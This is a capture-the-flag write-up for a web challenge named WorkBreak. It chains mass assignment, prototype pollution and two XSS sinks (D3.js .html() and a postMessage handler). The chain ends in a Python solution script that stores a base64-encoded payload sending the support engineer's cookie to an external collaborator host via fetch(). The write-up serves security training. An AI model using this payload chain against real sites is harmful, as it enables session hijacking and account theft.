# WorkBreak Writeup

## Objective:

The objective is to exploit an XSS vulnerability on the challenge domain and leverage it to exfiltrate the session cookie of the support engineer.

## Exploitation Steps:

First, the participant creates a user in the WorkBreak application.

The participant then reviews the HTTP traffic and notices the following endpoints: `/api/user/profile` and `/api/user/settings`, which are used to retrieve and submit profile information.
Strangely, all the data submitted via the `/api/user/settings` endpoint is reflected under the `"dynamicInfo"` key in the JSON response from the `/api/user/profile` endpoint (hinting at a vulnerability). After a bit of tinkering, the participant discovers that the application is vulnerable to a mass assignment vulnerability through these endpoints.

After reviewing the `performance_chart.js` script, the participant understands that the script consumes a “tasks" JSON array, which consists of objects with two keys: `tasksCompleted` and `date`. The `tasksCompleted` key is inserted into the sink via the `.html()` method of the D3.js library in several locations.

```js
const taskCounts = generateTaskHeatmapData(taskData);
const today = new Date().toISOString().split("T")[0];
const todayTask = taskData.find((task) => task.date === today);
const todayTasksDiv = d3.select("#todayTasks");
if (todayTask) {
    todayTasksDiv.html(`Tasks Completed Today: ${todayTask.tasksCompleted}`);
} else {
    todayTasksDiv.html("Tasks Completed Today: 0");
}
```

```js
on("mouseover", function (event, d) {
tooltip
.html(`Tasks Completed: ${d.count}`)...
```

The participant understands that, to exploit an XSS vulnerability here without user interaction, they need to insert the payload into the `tasksCompleted` JSON key with today’s date to pass the `if (todayTask)` statement.

When the participant attempts to use the mass assignment vulnerability to exploit the XSS, they receive the following response from the `/api/user/settings` endpoint:

### Request:

```json
{
    "name": "Anon",
    "phone": "",
    "position": "",
    "tasks": [
        {
            "date": "YYYY-MM-DD", // Today's date
            "tasksCompleted": "<img/src/onerror=alert(origin)>"
        }
    ]
}
```

### Response

```json
{
    "error": "Not Allowed to Modify Tasks"
}
```

To bypass this input validation mechanism, the participant notices that the `profie.js` script, which passes the “tasks" array to the `performance_chart.js` script, parses the `dynamicInfo` key from `/api/user/profile` in the following manner:

```js
const userSettings = Object.assign({ name: "", phone: "", position: "" }, profileData.dynamicInfo);
```

`Object.assign` should raise a red flag indicating a potential prototype pollution vulnerability. The participant crafts the following payload:

```json
{
    "name": "Anon",
    "phone": "",
    "position": "",
    "__proto__": {
        "tasks": [
            {
                "date": "YYYY-MM-DD", // Today's date
                "tasksCompleted": "<img/src/onerror=alert(origin)>"
            }
        ]
    }
}
```

It works! the participant is able to bypass the backend check of the `"tasks"` key and insert an alert to be executed using the D3.js library.
However, the origin is 'null' because the D3.js chart is contained within a sandbox iframe.

One small challenge remains for the participant. To exploit an XSS vulnerability on the challenge domain, the participant needs to peek again at the code of the `profile.js` script and find another sink that can be exploited using the contained XSS.

```js
// Not fully implemented - total tasks
window.addEventListener(
    "message",
    (event) => {
        if (event.source !== frames[0]) return;

        document.getElementById("totalTasks").innerHTML = `<p>Total tasks completed: ${event.data.totalTasks}</p>`;
    },
    false
);
```

The participant sends a postMessage to the EventListener and exploit the second XSS vulnerability:

```js
(async () => {
    parent.postMessage({ totalTasks: "<img/src/onerror=eval(atob(<ENCODED_PAYLOAD>))>" }, "*");
})();
```

Now that all vulnerabilities have been discovered, the next step for the participant is to craft a payload to exfiltrate the session cookie of the support engineer and solve the challenge.

## Solution Script

Let's put it all together with this solution script:

```py
import  requests
import  base64
import  datetime

FRONTEND_DOMAIN  =  "dev.local"  # Change
COLLABORATOR_DOMAIN  =  "aaa.oastify.com"  # Change

# Get a session
requests.post(f"http://{FRONTEND_DOMAIN}/api/auth/signup", json={"email": "solution@challenge.com", "password" : "Solution123"})
login_res  =  requests.post(f"http://{FRONTEND_DOMAIN}/api/auth/login", json={"email": "solution@challenge.com", "password" : "Solution123"}, allow_redirects=False)
sid  =  login_res.cookies.get("SID")
print(f"[+] session retrieved successfully: {sid}")

extract_flag  =  "(async () => {await fetch(`https://"  +  COLLABORATOR_DOMAIN  +  "/?${document.cookie}`);})();"
post_message_payload  =  f"(async () => {{parent.postMessage({{\"totalTasks\":\"<img/src/onerror=eval(atob('{base64.b64encode(extract_flag.encode('utf-8')).decode()}'))>\"}},'*');}})()"
payload  = {
	"name": "Anon",
	"phone": "",
	"position": "",
	"__proto__": {
		"tasks": [
			{
			"date": datetime.date.today().strftime("%Y-%m-%d"),
			"tasksCompleted": f"<img/src/onerror=eval(atob(\"{base64.b64encode(post_message_payload.encode("utf-8")).decode()}\"))>",
			}
		]
	},
}

# Store the XSS payload
requests.post(f"http://{FRONTEND_DOMAIN}/api/user/settings", headers={"Cookie": f"SID={sid}"}, json=payload)
print("[+] payload has been persisted!")

# Exploit the admin
uuid_res  =  requests.get(f"http://{FRONTEND_DOMAIN}/", headers={"Cookie": f"SID={sid}"}, allow_redirects=False)
requests.post(f"http://{FRONTEND_DOMAIN}/api/support/chat", headers={"Cookie": f"SID={sid}"}, json={"message":f"http://{FRONTEND_DOMAIN}{uuid_res.headers["Location"]}"})
print("[+] admin exploited - check the collaborator")
```
